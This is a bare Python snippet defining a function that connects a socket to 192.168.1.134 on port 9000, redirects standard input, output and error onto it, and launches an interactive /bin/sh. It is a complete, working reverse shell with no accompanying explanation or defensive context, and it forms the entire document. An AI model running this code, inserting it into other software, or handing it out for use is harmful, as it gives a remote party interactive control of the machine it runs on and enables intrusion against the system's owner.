import socket,subprocess,os

def shell():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.134",9000))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
